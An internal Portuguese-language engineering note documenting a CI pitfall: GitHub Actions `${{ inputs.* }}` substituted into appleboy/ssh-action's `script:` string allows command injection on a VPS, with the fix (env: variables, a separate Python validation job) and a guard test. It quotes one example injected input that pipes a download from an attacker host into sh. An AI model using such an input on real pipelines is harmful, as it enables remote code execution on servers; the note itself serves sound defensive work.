<!-- Entrada extraida de ARMADILHAS.md (o monolito) em 23/08/2026.
     Categoria de origem: §5 — Portões mecânicos do CI (eles reprovam de verdade)
     ID historico: §5.12  ·  referencias antigas "ARMADILHAS §5.12" apontam para este arquivo.
     O INDICE.md e GERADO: nao o edite a mao (python ci/indice_de_armadilhas.py). -->

# 5.12 `${{ inputs.* }}` dentro do `script:` da ssh-action é injeção de comando na VPS

**Sintoma:** nenhum — e é esse o problema. O workflow roda, o deploy funciona, e
um input de texto livre como `motivo='urgente"; curl atacante | sh; #'` executa
na VPS com o usuário `deploy`.
**Causa:** o `script:` da `appleboy/ssh-action` é uma STRING, e `${{ }}` é
substituição de TEXTO feita pelo GitHub **antes** de o shell existir. O valor não
chega como argumento; chega como código-fonte. Vale para todo `run:` também.
**Solução:** o que for texto livre entra por `env:` e é lido como `"$VAR"` — aí o
shell recebe dado, não código. O que precisa mesmo ser interpolado tem de ser
provado antes por um portão em Python (em `ci/rollback.py`: célula ∈ manifesto,
alvo = `main` ou 40 hex ancestral da `main`) — é para isso que a validação roda
num job separado, ANTES do job que tem a chave SSH. Teste-guarda que impede a
regressão: `test_motivo_e_texto_livre_e_nunca_entra_no_script_do_ssh`, em
`ci/tests/test_rollback.py`, lê o YAML e reprova se `inputs.motivo` reaparecer
dentro de um `script:`.
**Origem:** despacho infra/rollback-pelo-pipeline (23/08/2026), na revisão do
próprio workflow antes de abrir o PR.
